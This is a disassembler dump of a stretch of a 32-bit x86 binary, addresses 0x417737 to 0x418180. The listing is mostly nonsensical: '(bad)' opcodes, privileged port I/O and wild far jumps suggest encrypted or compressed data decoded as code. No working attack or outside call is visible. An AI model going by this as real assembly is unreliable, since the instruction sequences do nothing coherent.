  417737:	dec    ebp
  417738:	sbb    eax,0x9f02650b
  41773d:	mov    eax,ds:0xa8e4a617
  417742:	mov    dh,0xd
  417744:	test   BYTE PTR [ebp+0x4160a69a],cl
  41774a:	adc    al,0xe5
  41774c:	lods   eax,DWORD PTR ds:[esi]
  41774d:	ja     0x4177a7
  41774f:	mov    esp,0x14061fea
  417754:	cdq    
  417755:	mov    WORD PTR [ecx+eiz*2-0x78],ds
  417759:	ror    DWORD PTR [esi+0x57181204],1
  41775f:	cmp    eax,0xec755cbc
  417764:	pop    edx
  417765:	cmp    edx,DWORD PTR [ecx-0x24]
  417768:	pop    esp
  417769:	adc    eax,0xaf1810d9
  41776e:	(bad)  
  41776f:	test   al,0x6d
  417771:	out    0xeb,eax
  417773:	lods   eax,DWORD PTR ds:[esi]
  417774:	xor    eax,0x2a7e608a
  417779:	(bad)  
  41777a:	pop    ebp
  41777b:	push   cs
  41777c:	(bad)  
  41777d:	mov    cl,0xd
  41777f:	fidiv  DWORD PTR [ecx-0x6e5aac5b]
  417785:	or     DWORD PTR [esp+esi*4-0x46af6f44],edi
  41778c:	fwait
  41778d:	cld    
  41778e:	icebp  
  41778f:	add    eax,DWORD PTR [eax]
	...
  4177f1:	add    BYTE PTR [eax],al
  4177f3:	add    cl,ch
  4177f5:	push   cs
  4177f6:	(bad)  
  4177f7:	pop    ss
  4177f8:	push   edi
  4177fa:	jmp    0x233417fd
  4177ff:	shr    BYTE PTR [ebx+0x744ded69],cl
  417805:	clc    
  417806:	add    BYTE PTR [eax],al
  417808:	add    al,0x1
  41780a:	add    BYTE PTR [eax],al
  41780c:	dec    eax
  41780d:	enter  0x8ebe,0xd7
  417811:	jae    0x41788d
  417813:	adc    DWORD PTR [eax+0x7b2008b3],edi
  417819:	jnp    0x4177db
  41781b:	and    DWORD PTR [edi-0x5c],ebp
  41781e:	loope  0x41783a
  417820:	leave  
  417821:	or     esi,ebp
  417823:	sbb    bh,al
  417825:	push   0xffffffdb
  417827:	call   0xa1cac8e
  41782c:	neg    DWORD PTR [esi-0x3b]
  41782f:	lods   eax,DWORD PTR ds:[esi]
  417830:	and    bh,BYTE PTR [edi+edx*8]
  417833:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417834:	rcl    BYTE PTR [ecx+0x16],1
  417837:	icebp  
  417838:	sbb    bh,BYTE PTR [ebp+0x17]
  41783b:	xor    BYTE PTR [esp+ebx*2-0x47],ah
  41783f:	lods   eax,DWORD PTR ds:[esi]
  417840:	mov    BYTE PTR [edi],dl
  417842:	leave  
  417843:	cwde   
  417844:	mov    eax,0x75c5ac20
  417849:	loop   0x41780c
  41784b:	nop
  41784c:	jne    0x4177d4
  41784e:	or     al,0xe
  417850:	sar    ebp,1
  417852:	out    0x15,al
  417854:	xchg   esi,eax
  417855:	mov    al,0xf9
  417857:	dec    edi
  417858:	dec    esp
  417859:	les    ecx,FWORD PTR [ebp+0x1c]
  41785c:	push   0x69
  41785e:	gs push edi
  417860:	gs add eax,0x10bf807b
  417866:	arpl   dx,di
  417868:	fxch   st(3)
  41786a:	ja     0x417818
  41786c:	inc    ecx
  41786d:	jge    0x417888
  41786f:	fnstcw WORD PTR [ecx-0x1c]
  417872:	pop    edx
  417873:	dec    esp
  417874:	mov    ah,0x1c
  417876:	mov    ch,BYTE PTR [ecx]
  417878:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417879:	mov    edi,0xe878c674
  41787e:	stc    
  41787f:	in     al,dx
  417880:	in     al,0x52
  417882:	test   eax,0xe3369571
  417887:	jl     0x417827
  417889:	add    DWORD PTR [esi+edi*2+0x7d89dbdd],esi
  417890:	icebp  
  417891:	pop    es
  417892:	aad    0x24
  417894:	jnp    0x4178f4
  417896:	lahf   
  417897:	in     al,0x4e
  417899:	xor    DWORD PTR [esi],edx
  41789b:	rol    DWORD PTR [edi-0x39d8ec98],0x87
  4178a2:	xor    DWORD PTR [ebx],ecx
  4178a4:	outs   dx,DWORD PTR ds:[esi]
  4178a5:	adc    BYTE PTR [ebx+0x73ab8ce0],cl
  4178ab:	mov    bh,0xfc
  4178ad:	out    0x67,eax
  4178af:	sub    BYTE PTR [esi],dh
  4178b1:	ret    0x5622
  4178b4:	jecxz  0x4178ba
  4178b6:	loop   0x4178e9
  4178b8:	shr    BYTE PTR [edx-0x7a33c27],0x4a
  4178bf:	in     eax,dx
  4178c0:	(bad)  
  4178c1:	jbe    0x41793a
  4178c3:	cdq    
  4178c4:	stc    
  4178c5:	repnz out dx,eax
  4178c7:	mov    BYTE PTR [ecx],0xcb
  4178ca:	jg     0x41789f
  4178cc:	mov    bl,0xe
  4178ce:	shl    DWORD PTR [eax-0x58],cl
  4178d1:	dec    ebp
  4178d2:	dec    eax
  4178d3:	adc    eax,DWORD PTR [edx-0x3a]
  4178d6:	add    al,0x63
  4178d8:	(bad)  
  4178da:	mov    ch,0x6b
  4178dc:	div    DWORD PTR [edx-0x228c6b52]
  4178e2:	test   eax,0x453ce9de
  4178e7:	xchg   edi,eax
  4178e8:	xor    eax,0x6140b4ac
  4178ed:	cwde   
  4178ee:	(bad)  
  4178f0:	rol    DWORD PTR [ecx-0x7181f67e],1
  4178f6:	xor    edi,DWORD PTR ss:[ebp+0x19]
  4178fa:	push   ebx
  4178fb:	fsubrp st(2),st
  4178fd:	sbb    ch,al
  4178ff:	or     al,0x14
  417901:	push   edx
  417902:	mov    esi,DWORD PTR [edi+ecx*4]
  417905:	adc    dl,dh
  417907:	ss inc ecx
  417909:	ins    DWORD PTR es:[edi],dx
  41790a:	sahf   
  41790b:	and    ecx,DWORD PTR [esi+0x3f8d8f]
	...
  417971:	add    BYTE PTR [eax],al
  417973:	add    BYTE PTR [eax+0x41],bl
  417976:	pop    ds
  417977:	lods   eax,DWORD PTR ds:[esi]
  417978:	pop    ds
  417979:	(bad)  
  41797a:	cli    
  41797b:	cmc    
  41797c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41797d:	retf   0xe5d4
  417980:	mov    eax,0x783d7d91
  417985:	stc    
  417986:	add    BYTE PTR [eax],al
  417988:	add    al,0x1
  41798a:	add    BYTE PTR [eax],al
  41798c:	aas    
  41798d:	outs   dx,BYTE PTR ds:[esi]
  41798e:	sub    ah,BYTE PTR [ecx+0x55068256]
  417994:	mov    ebp,DWORD PTR [ebp+0x629cd416]
  41799a:	jecxz  0x41798f
  41799c:	loop   0x417956
  41799e:	sub    al,BYTE PTR [eax]
  4179a0:	push   cs
  4179a1:	jbe    0x4179bc
  4179a3:	ja     0x417a1a
  4179a5:	pushf  
  4179a6:	pop    ecx
  4179a7:	cmp    esi,ecx
  4179a9:	dec    eax
  4179aa:	jno    0x4179a6
  4179ac:	retf   0x3a3c
  4179af:	mov    ebx,0xd7574c5a
  4179b4:	push   eax
  4179b5:	jge    0x41796b
  4179b7:	shl    bh,0xf0
  4179ba:	jmp    0x744a:0xd99fb142
  4179c1:	fs popa 
  4179c3:	push   ds
  4179c4:	ret    
  4179c5:	xor    eax,0xf774bfa4
  4179ca:	arpl   WORD PTR [eax],bx
  4179cc:	ret    0xff81
  4179cf:	or     BYTE PTR [ebp+0x28],ah
  4179d2:	ja     0x417a49
  4179d4:	sub    eax,0x92f3390d
  4179d9:	sbb    eax,0xddebb719
  4179de:	ror    DWORD PTR [esi+0x7b969d48],0x1d
  4179e5:	cmp    eax,0xfb3a5bd
  4179ea:	adc    eax,0xf2154fc4
  4179ef:	aas    
  4179f0:	xor    eax,0x63ead9a9
  4179f5:	call   0x86f2defd
  4179fa:	pop    ebx
  4179fb:	les    esp,FWORD PTR [edi+0x62]
  4179fe:	pop    edx
  4179ff:	retf   0xda66
  417a02:	test   DWORD PTR [eax+0x69],ebp
  417a05:	xchg   esp,eax
  417a06:	je     0x417a4a
  417a08:	stos   BYTE PTR es:[edi],al
  417a09:	popa   
  417a0a:	cwde   
  417a0b:	xchg   ecx,eax
  417a0c:	arpl   WORD PTR [ebx-0x63],bp
  417a0f:	outs   dx,BYTE PTR ds:[esi]
  417a10:	loop   0x417a05
  417a12:	inc    eax
  417a13:	mov    es,WORD PTR [eax+ecx*8+0x1f91ecc5]
  417a1a:	xor    BYTE PTR [ebp+0x3a],al
  417a1d:	enter  0x1082,0x86
  417a21:	jmp    0xe17a:0xd2b95942
  417a28:	sbb    eax,0x9c36152c
  417a2d:	inc    ebx
  417a2e:	cmp    BYTE PTR [eax+0x8],bh
  417a31:	mov    ecx,0xec8a5570
  417a36:	jmp    0x278da73d
  417a3b:	retf   0x452c
  417a3e:	ficom  WORD PTR [ebp+0x3d]
  417a41:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417a42:	mov    ss,WORD PTR [edi+0x4740302d]
  417a48:	xchg   ebx,eax
  417a49:	retf   
  417a4a:	les    ecx,FWORD PTR [eax-0x1cf337cc]
  417a50:	(bad)  
  417a51:	out    0x24,eax
  417a53:	xor    ah,BYTE PTR [ecx-0x71]
  417a56:	jle    0x417a85
  417a58:	sbb    al,0x15
  417a5a:	cmp    bh,bh
  417a5c:	gs mov dl,0x5b
  417a5f:	adc    esp,DWORD PTR [ecx+0x7b07086d]
  417a65:	adc    edx,esp
  417a67:	enter  0x63b0,0x32
  417a6b:	stos   DWORD PTR es:[edi],eax
  417a6c:	pop    es
  417a6d:	lods   al,BYTE PTR ds:[esi]
  417a6e:	test   BYTE PTR [eax-0x55],dh
  417a71:	ss into 
  417a73:	rol    dh,cl
  417a75:	push   cs
  417a76:	pop    ebx
  417a77:	sbb    eax,0xabffb505
  417a7c:	add    al,bh
  417a7e:	std    
  417a7f:	xchg   edi,eax
  417a80:	mov    al,0x7
  417a82:	js     0x417adb
  417a84:	mov    ds:0x22d57f85,al
  417a89:	or     BYTE PTR cs:[ecx],0xc4
  417a8d:	dec    esp
  417a8e:	xchg   ecx,eax
  417a8f:	arpl   WORD PTR [eax],ax
	...
  417af1:	add    BYTE PTR [eax],al
  417af3:	add    BYTE PTR [edi],ch
  417af5:	stos   DWORD PTR es:[edi],eax
  417af6:	cdq    
  417af7:	inc    ecx
  417af8:	popf   
  417af9:	jae    0x417afa
  417afb:	out    dx,eax
  417afc:	(bad)  [eax]
  417afe:	xor    ebx,DWORD PTR [ecx+0x3ee5335f]
  417b04:	jl     0x417b00
  417b06:	add    BYTE PTR [eax],al
  417b08:	add    al,0x1
  417b0a:	add    BYTE PTR [eax],al
  417b0c:	lods   eax,DWORD PTR ds:[esi]
  417b0d:	push   esi
  417b0e:	mov    bh,0x1f
  417b10:	xchg   edx,eax
  417b11:	in     al,dx
  417b12:	xor    eax,0x5da58d66
  417b17:	cmc    
  417b18:	dec    esi
  417b19:	sbb    DWORD PTR [ebp+0x49467ebe],0xdbcf2d59
  417b23:	push   esi
  417b24:	push   ebx
  417b25:	retf   0x5e99
  417b28:	hlt    
  417b29:	add    eax,0xd25edee8
  417b2e:	sbb    al,0xe6
  417b30:	push   edi
  417b31:	cli    
  417b32:	popf   
  417b33:	xor    edi,edi
  417b35:	rol    esi,1
  417b37:	pop    esp
  417b38:	or     ah,BYTE PTR [ebx+eax*1+0x39]
  417b3c:	mov    esp,eax
  417b3e:	dec    edi
  417b3f:	jae    0x417ad9
  417b41:	jnp    0x417ba2
  417b43:	mov    ds:0x6b111d84,al
  417b48:	scas   al,BYTE PTR es:[edi]
  417b49:	xlat   BYTE PTR ds:[ebx]
  417b4a:	jne    0x417ae0
  417b4c:	sahf   
  417b4d:	push   esp
  417b4e:	adc    eax,0xed8b0002
  417b53:	imul   ebp,edi,0x15
  417b56:	inc    esi
  417b57:	enter  0xe2dc,0xe
  417b5b:	jge    0x417b37
  417b5d:	mov    edx,0x54d96beb
  417b62:	fbstp  TBYTE PTR [ecx-0x66]
  417b65:	jb     0x417bdc
  417b67:	inc    BYTE PTR [ecx]
  417b69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417b6a:	push   esi
  417b6b:	add    al,0x43
  417b6d:	cwde   
  417b6e:	and    BYTE PTR [esi+0x5d],ah
  417b71:	jmp    0xa522d280
  417b76:	or     dh,BYTE PTR [esi]
  417b78:	mov    bl,0x26
  417b7a:	inc    esi
  417b7b:	sahf   
  417b7c:	pop    edi
  417b7d:	mov    DWORD PTR [esi-0x1b532417],0x4a3cacba
  417b87:	push   ds
  417b88:	sahf   
  417b89:	fistp  QWORD PTR [ebx-0x641f708d]
  417b8f:	ret    
  417b90:	dec    esi
  417b91:	popf   
  417b92:	outs   dx,DWORD PTR ds:[esi]
  417b93:	push   es
  417b94:	adc    eax,DWORD PTR [edx]
  417b96:	and    ah,BYTE PTR [edx+0x55f76034]
  417b9c:	loopne 0x417b62
  417b9e:	xor    bh,BYTE PTR [ebp-0xd5f2731]
  417ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ba5:	jl     0x417b40
  417ba7:	fidiv  WORD PTR [edx]
  417ba9:	(bad)  
  417bab:	arpl   dx,cx
  417bad:	cmp    eax,0xaaaae67f
  417bb2:	fwait
  417bb3:	inc    ebx
  417bb4:	mov    cl,0x53
  417bb6:	add    ebp,DWORD PTR [ebx+ebp*1]
  417bb9:	inc    edx
  417bba:	ins    BYTE PTR es:[edi],dx
  417bbb:	pop    edi
  417bbc:	imul   edx,DWORD PTR [ebx],0xffffffb4
  417bbf:	(bad)  
  417bc0:	in     al,dx
  417bc1:	mov    esi,0xf19a4c87
  417bc6:	cmp    bh,BYTE PTR [edi+0x2c]
  417bc9:	out    dx,al
  417bca:	xor    al,0xe1
  417bcc:	xor    bl,BYTE PTR [edi]
  417bce:	je     0x417bf8
  417bd0:	retf   
  417bd1:	lahf   
  417bd2:	bound  ebx,QWORD PTR [esi+ebp*1+0x46]
  417bd6:	test   ebp,edi
  417bd8:	stos   DWORD PTR es:[edi],eax
  417bd9:	inc    edx
  417bda:	add    bl,BYTE PTR [esi+ebx*8+0x8d36db]
  417be1:	repz push edi
  417be3:	fwait
  417be4:	in     al,dx
  417be5:	jl     0x417c4f
  417be7:	(bad)  
  417be8:	in     al,dx
  417be9:	cmp    al,0x47
  417beb:	and    esi,DWORD PTR [ebp-0x5d]
  417bee:	mov    ch,0xf5
  417bf0:	or     ebx,DWORD PTR [ecx]
  417bf2:	out    0xbf,eax
  417bf4:	es loope 0x417c07
  417bf7:	rcr    al,0xe9
  417bfa:	jge    0x417baa
  417bfc:	call   0x8957d076
  417c01:	cs stc 
  417c03:	hlt    
  417c04:	jecxz  0x417bbb
  417c06:	cmp    esi,ecx
  417c08:	add    eax,0xe0e687a4
  417c0d:	jecxz  0x417c4a
  417c0f:	and    BYTE PTR [eax],al
	...
  417c71:	add    BYTE PTR [eax],al
  417c73:	add    BYTE PTR [ecx-0x267b6f40],cl
  417c79:	aam    0x9d
  417c7b:	int    0x75
  417c7d:	aaa    
  417c7e:	das    
  417c7f:	aam    0xc3
  417c81:	and    al,0xd0
  417c83:	push   esi
  417c84:	cmp    bl,0x0
  417c87:	add    BYTE PTR [ecx+eax*1],al
  417c8a:	add    BYTE PTR [eax],al
  417c8c:	mov    ah,0xed
  417c8e:	push   esi
  417c8f:	mov    DWORD PTR [edx+0x61],ebp
  417c92:	dec    esi
  417c93:	test   al,0xc7
  417c95:	scas   eax,DWORD PTR es:[edi]
  417c96:	add    DWORD PTR [ebp-0x93227aa],edx
  417c9c:	sub    al,0x11
  417c9e:	fsubr  QWORD PTR [esi-0x3f]
  417ca1:	sub    dh,ch
  417ca3:	jl     0x417d07
  417ca5:	mov    WORD PTR [ebp-0x1a],?
  417ca8:	les    edx,FWORD PTR [edx+ebx*8+0x24]
  417cac:	or     eax,0x5ead739f
  417cb1:	or     ebp,DWORD PTR [edi+0x28456fde]
  417cb7:	in     al,dx
  417cb8:	(bad)  
  417cb9:	pusha  
  417cba:	ret    
  417cbb:	rcl    DWORD PTR ds:0x44afbf74,1
  417cc1:	pop    ss
  417cc2:	sbb    DWORD PTR [ebx+eax*4-0xc],ecx
  417cc6:	lds    eax,FWORD PTR [ebx]
  417cc8:	inc    edi
  417cc9:	add    eax,0x46602be
  417cce:	(bad)  
  417ccf:	shl    BYTE PTR [esi+0x74eda3a3],cl
  417cd5:	dec    ebx
  417cd6:	imul   eax,DWORD PTR [esi+0x6c],0xa943b2
  417cdd:	leave  
  417cde:	xor    eax,0xbe97a76f
  417ce3:	test   al,0x44
  417ce5:	stc    
  417ce6:	sub    DWORD PTR [eax-0x6a],0xffffffdd
  417cea:	add    al,0x7d
  417cec:	sub    ah,cl
  417cee:	push   ebp
  417cef:	inc    edx
  417cf0:	cmp    edx,ebx
  417cf2:	test   al,0x5a
  417cf4:	ins    BYTE PTR es:[edi],dx
  417cf5:	daa    
  417cf6:	psubq  mm1,mm6
  417cf9:	add    ecx,DWORD PTR [ecx+edx*1-0x1ec1155c]
  417d00:	add    eax,DWORD PTR [edi]
  417d02:	xchg   esi,eax
  417d03:	(bad)  
  417d04:	push   0x215872f6
  417d09:	dec    edi
  417d0a:	cmp    DWORD PTR [edi],edi
  417d0c:	or     edi,DWORD PTR [ebx+0x6c]
  417d0f:	xor    al,dh
  417d11:	xchg   ebx,eax
  417d12:	into   
  417d13:	ins    BYTE PTR es:[edi],dx
  417d14:	arpl   WORD PTR [esi+0x49],dx
  417d17:	mov    edx,eax
  417d19:	push   ebp
  417d1a:	inc    esp
  417d1b:	rol    DWORD PTR [edx],cl
  417d1d:	adc    edx,edx
  417d1f:	xchg   esi,eax
  417d20:	or     eax,0x32fc13b1
  417d25:	or     BYTE PTR [esp+ebp*8],bh
  417d28:	ret    
  417d29:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417d2a:	popf   
  417d2b:	loope  0x417ced
  417d2d:	pop    ss
  417d2e:	xor    DWORD PTR [ebx-0x2b1505c9],ecx
  417d34:	loopne 0x417ccf
  417d36:	aam    0x24
  417d38:	sub    cl,cl
  417d3a:	pop    esi
  417d3b:	int3   
  417d3c:	lds    eax,FWORD PTR [esi-0x3d]
  417d3f:	adc    eax,0xdb44603e
  417d44:	fs iret 
  417d46:	call   0x3e24:0x135eebf7
  417d4d:	sub    cl,BYTE PTR [esp+ebx*2-0x60cf99c6]
  417d54:	stc    
  417d55:	stos   BYTE PTR es:[edi],al
  417d56:	and    DWORD PTR [ebx],eax
  417d58:	or     al,0x34
  417d5a:	dec    edi
  417d5b:	fwait
  417d5c:	push   ss
  417d5d:	adc    esp,esp
  417d5f:	data16 fld DWORD PTR [eax-0x468d9672]
  417d66:	jmp    0xa60d:0xe7b6807f
  417d6d:	dec    edx
  417d6e:	imul   ebp,DWORD PTR [edi-0x3b32babb],0xe7e953e5
  417d78:	mov    esi,0x79df6f42
  417d7d:	sahf   
  417d7e:	pop    ds
  417d7f:	shr    BYTE PTR [ebp+ebx*2-0x1b6f918],1
  417d86:	ret    0x9ea
  417d89:	add    esi,DWORD PTR [ebp+0x40d96bd6]
  417d8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
	...
  417df4:	pop    ss
  417df5:	arpl   WORD PTR ds:0x5f7f7d53,bx
  417dfb:	addr16 dec esi
  417dfd:	sub    BYTE PTR [ecx+0x46],ch
  417e00:	xor    BYTE PTR ds:0xfc84afb9,bh
  417e06:	add    BYTE PTR [eax],al
  417e08:	add    al,0x1
  417e0a:	add    BYTE PTR [eax],al
  417e0c:	ins    BYTE PTR es:[edi],dx
  417e0d:	imul   esp,DWORD PTR [eax],0x1b
  417e10:	ds or  ecx,ecx
  417e13:	ss daa 
  417e15:	push   0xffffffa4
  417e17:	cmc    
  417e18:	pop    esp
  417e19:	xchg   edi,eax
  417e1a:	xor    DWORD PTR [edx],ebx
  417e1c:	xchg   ebx,eax
  417e1d:	call   0x5d6e:0xe974a699
  417e24:	out    0xf,al
  417e26:	ins    DWORD PTR es:[edi],dx
  417e27:	rcr    BYTE PTR [ebx+0x50],0xde
  417e2b:	and    bh,BYTE PTR [ebx]
  417e2d:	ret    0x2dda
  417e30:	cli    
  417e31:	sbb    BYTE PTR [esi],dl
  417e33:	lock jmp FWORD PTR [edx+0x1e]
  417e37:	out    dx,eax
  417e38:	push   cs
  417e39:	xor    DWORD PTR [ebp+0x395c9b03],esi
  417e3f:	jns    0x417e21
  417e41:	push   edx
  417e42:	add    al,0x46
  417e44:	xor    bh,bl
  417e46:	aas    
  417e47:	pop    ds
  417e48:	repz xchg ecx,eax
  417e4a:	or     al,0xf
  417e4c:	xchg   edi,eax
  417e4d:	dec    edi
  417e4e:	cmp    DWORD PTR [esi-0x29670e8f],ebx
  417e54:	jl     0x417eb7
  417e56:	inc    ecx
  417e57:	add    BYTE PTR [ecx+ecx*4-0x542a7509],bl
  417e5e:	or     dl,dl
  417e60:	repz push 0xffffffb3
  417e63:	arpl   bx,bp
  417e65:	sar    BYTE PTR [edi-0x7a7bfcea],0x8
  417e6c:	ins    BYTE PTR es:[edi],dx
  417e6d:	outs   dx,DWORD PTR ds:[esi]
  417e6e:	sbb    ebp,ebx
  417e70:	xchg   ecx,eax
  417e71:	cmp    BYTE PTR [ebp-0x53],bh
  417e74:	shl    BYTE PTR [edx+0x48],cl
  417e77:	adc    DWORD PTR [eax+edx*8],edx
  417e7a:	push   eax
  417e7b:	mov    edx,ecx
  417e7d:	test   BYTE PTR [esi+0x6f208a35],0xcc
  417e84:	lock sbb ebp,DWORD PTR cs:[ecx+0x31154da3]
  417e8c:	int3   
  417e8d:	or     BYTE PTR [ebp+0x48],ah
  417e90:	adc    edi,DWORD PTR [edi-0x33b31034]
  417e96:	inc    eax
  417e97:	das    
  417e98:	inc    ecx
  417e99:	neg    DWORD PTR [ecx+0x69]
  417e9c:	xchg   ecx,eax
  417e9d:	jno    0x417e81
  417e9f:	pop    ebx
  417ea0:	loope  0x417e99
  417ea2:	(bad)  [ecx-0x67]
  417ea5:	and    DWORD PTR [ecx+0x1253ad48],esp
  417eab:	outs   dx,BYTE PTR ds:[esi]
  417eac:	add    esi,esi
  417eae:	and    al,0xb8
  417eb0:	enter  0x1075,0x6
  417eb4:	mov    ch,0x9d
  417eb6:	xchg   esp,eax
  417eb7:	pop    es
  417eb8:	(bad)
  417ebb:	imul   eax,ebx,0xaef44da2
  417ec1:	mov    eax,ds:0xeac22a65
  417ec6:	cmc    
  417ec7:	imul   eax,DWORD PTR [esi+0xa],0xd1f8c4f
  417ece:	mov    ebp,DWORD PTR [esp+ebx*8-0x795ee810]
  417ed5:	xchg   esp,eax
  417ed6:	(bad)  [eax+ecx*1-0x3f7d6967]
  417edd:	inc    eax
  417ede:	les    edx,FWORD PTR [edi-0x4acd5c96]
  417ee4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417ee5:	push   ds
  417ee6:	sub    BYTE PTR [eax+0x5e],dh
  417ee9:	loope  0x417ed0
  417eeb:	dec    eax
  417eec:	sub    eax,0x92c59c39
  417ef1:	mov    ds:0x765efbc,al
  417ef6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417ef7:	ins    DWORD PTR es:[edi],dx
  417ef8:	mov    ebp,0x263570c3
  417efd:	add    eax,0x8e95dfa2
  417f02:	iret   
  417f03:	(bad)  
  417f04:	jl     0x417f51
  417f06:	mov    ebx,0xd50ac0cf
  417f0b:	xchg   edx,eax
  417f0c:	mov    ?,WORD PTR [ebx+0x6b34]
	...
  417f72:	add    BYTE PTR [eax],al
  417f74:	(bad)  
  417f75:	out    0xe6,al
  417f77:	cmp    esp,esi
  417f79:	cmp    edi,edi
  417f7b:	push   DWORD PTR [edx]
  417f7d:	xchg   edx,eax
  417f7e:	xor    al,bh
  417f80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f81:	aad    0x39
  417f83:	mov    ch,0x88
  417f85:	std    
  417f86:	add    BYTE PTR [eax],al
  417f88:	add    al,0x1
  417f8a:	add    BYTE PTR [eax],al
  417f8c:	add    bl,ah
  417f8e:	pop    ebp
  417f8f:	out    dx,al
  417f90:	mov    ebp,0x923bc183
  417f95:	int    0xc3
  417f97:	xor    ch,BYTE PTR ds:0x52196c3f
  417f9d:	cs xchg ebx,eax
  417f9f:	mov    ch,0x19
  417fa1:	cdq    
  417fa2:	xchg   ebx,eax
  417fa3:	out    dx,al
  417fa4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417fa5:	xchg   ebx,eax
  417fa6:	add    al,ch
  417fa8:	jb     0x417fb8
  417faa:	jmp    0x418005
  417fac:	cmp    ebx,ebp
  417fae:	add    eax,0x71fc9327
  417fb3:	test   bh,dl
  417fb5:	dec    esi
  417fb6:	mov    eax,ds:0xacc3d4e1
  417fbb:	cmp    eax,0xf3647369
  417fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417fc1:	loop   0x417fcd
  417fc3:	ds out dx,eax
  417fc5:	cmp    DWORD PTR [eax-0xe395124],ebp
  417fcb:	iret   
  417fcc:	dec    ebx
  417fcd:	rcr    DWORD PTR [edx+0x30e2ee94],0x6b
  417fd4:	shr    ebx,1
  417fd6:	mov    dh,0x6b
  417fd8:	adc    dl,BYTE PTR [edx]
  417fda:	mov    dh,BYTE PTR [ebp+0x495bc5bd]
  417fe0:	mov    ebp,0x7e26b2bb
  417fe5:	or     al,0xdd
  417fe7:	or     BYTE PTR [esi+0x7f],dh
  417fea:	outs   dx,BYTE PTR ds:[esi]
  417feb:	hlt    
  417fec:	aad    0x67
  417fee:	inc    ebp
  417fef:	test   eax,0xc41032d7
  417ff4:	inc    edi
  417ff5:	or     al,0xa6
  417ff7:	fcmovne st,st(7)
  417ff9:	cmp    eax,0x92737817
  417ffe:	sub    ch,BYTE PTR [ebx-0x25fe8095]
  418004:	mov    ds:0x90441f1f,eax
  418009:	xchg   BYTE PTR [ecx-0x26],dl
  41800c:	loope  0x417fb4
  41800e:	or     DWORD PTR [edi+0x7d4a872e],0x45008a7e
  418018:	pop    ebp
  418019:	retf   0x91c4
  41801c:	popa   
  41801d:	out    dx,al
  41801e:	inc    ebx
  41801f:	adc    DWORD PTR [eax-0x57],edx
  418022:	bound  eax,QWORD PTR [edx-0x42]
  418025:	cmp    cl,ch
  418027:	push   ebx
  418028:	mov    edx,0x87b290c8
  41802d:	dec    ebp
  41802e:	js     0x41801a
  418030:	retf   
  418031:	daa    
  418032:	(bad)  
  418033:	jne    0x417fe7
  418035:	sub    dl,BYTE PTR [edi-0x24]
  418038:	retf   
  418039:	push   eax
  41803a:	mov    ebx,0x65ee7420
  41803f:	pop    esp
  418040:	jge    0x417fc7
  418042:	(bad)  cs:[esi]
  418045:	jmp    0x418062
  418047:	and    eax,0x51b9246
  41804c:	out    dx,al
  41804d:	jle    0x418017
  41804f:	mov    dl,0xdc
  418051:	stos   BYTE PTR es:[edi],al
  418052:	jmp    DWORD PTR [edi]
  418054:	fmul   st(3),st
  418056:	add    eax,0x64fb8d30
  41805b:	call   0xc285be64
  418060:	imul   ecx,esp,0xffffffbb
  418063:	lods   al,BYTE PTR ds:[esi]
  418064:	mov    WORD PTR [eax],fs
  418066:	fcomp  DWORD PTR [ebp+eax*4+0x514ca99f]
  41806d:	add    ebp,DWORD PTR [ebp+0x280210d7]
  418073:	fst    DWORD PTR [esp+edi*1+0x21]
  418077:	sahf   
  418078:	xor    dl,dh
  41807a:	ss add cl,dl
  41807d:	les    ebx,FWORD PTR [edi+0x122a2b53]
  418083:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418084:	push   ss
  418085:	and    bh,BYTE PTR [eax+0x24e6bf65]
  41808b:	mov    ebp,DWORD PTR [ebx]
  41808d:	lock mov ebp,0x78
	...
  4180f3:	add    BYTE PTR [ecx-0xba9482],ch
  4180f9:	push   ebp
  4180fa:	scas   eax,DWORD PTR es:[edi]
  4180fb:	(bad)  
  4180fc:	mov    ds:0x142fdebc,eax
  418101:	in     al,0x9c
  418103:	or     DWORD PTR [esi+edi*8+0x1040000],ecx
  41810a:	add    BYTE PTR [eax],al
  41810c:	(bad)  
  41810d:	cmp    DWORD PTR [ecx],ebp
  41810f:	or     BYTE PTR [ecx],0xa6
  418112:	(bad)  
  418113:	std    
  418114:	test   al,0x2f
  418116:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418117:	mov    ds:0x27b3a2b3,al
  41811c:	dec    edx
  41811d:	fild   DWORD PTR [edx+ebx*4-0x35155e1c]
  418124:	sbb    eax,0x5694dba2
  418129:	jge    0x418131
  41812b:	sbb    DWORD PTR [ecx-0x17],esp
  41812e:	pop    ebp
  41812f:	jne    0x418100
  418131:	arpl   WORD PTR [ebp-0x2e],bx
  418134:	sub    DWORD PTR [esi],esp
  418136:	jne    0x41813e
  418138:	pop    edx
  418139:	pop    ds
  41813a:	jmp    0x1340:0x91372f91
  418141:	pop    ds
  418142:	cwde   
  418143:	aad    0xf9
  418145:	mov    bl,0xe4
  418147:	mov    dl,0x7b
  418149:	mov    ds:0xd3e481a1,eax
  41814e:	in     eax,dx
  41814f:	aad    0x85
  418151:	mov    bl,bl
  418153:	xor    dl,BYTE PTR [edi+0x69]
  418156:	and    ebp,esp
  418158:	aam    0x4c
  41815a:	call   0x6a9e633c
  41815f:	mov    ds:0x8f2174f3,al
  418164:	jae    0x418151
  418166:	cwde   
  418167:	(bad)  
  418168:	hlt    
  418169:	cs jmp 0x4181a9
  41816c:	ret    
  41816d:	cwde   
  41816e:	adc    al,0xc6
  418170:	enter  0x3b4f,0x16
  418174:	ss aas 
  418176:	out    0x11,al
  418178:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  41817a:	push   ebp
  41817b:	pop    ebx
  41817c:	xlat   BYTE PTR ds:[ebx]
  41817d:	lods   al,BYTE PTR ds:[esi]
  41817e:	cmp    al,0xa4
  418180:	repnz push edi
